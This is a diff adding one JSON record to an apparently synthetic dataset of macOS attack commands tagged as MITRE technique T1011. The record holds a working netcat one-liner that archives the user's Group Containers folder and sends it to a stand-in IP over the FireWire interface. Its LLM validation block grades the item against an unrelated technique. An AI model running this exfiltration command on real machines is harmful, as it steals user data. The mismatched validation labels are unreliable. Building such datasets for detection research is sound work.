@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar cf - ~/Library/Group\\ Containers | gzip -1 | nc -s \"$(networksetup -getinfo 'FireWire' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.10 55284",
+  "explanation": "Binds to the FireWire networking service to send compressed data over a seldom-used medium, matching T1011 intent.",
+  "rationale_steps": [
+    "Get FireWire interface IP using networksetup",
+    "Bind netcat to the FireWire address",
+    "Exfiltrate compressed archive to a high port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-19546b01",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The pipeline is well-formed with balanced quotes, valid command substitutions, and correct flags for tar, gzip, and nc.",
+        "semantic_score": 1,
+        "semantic_justification": "While it exfiltrates data via a specific network interface, it does not abuse trusted/signed system scripts or script hosts as described for System Script Proxy Execution.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T21:31:32.109753Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
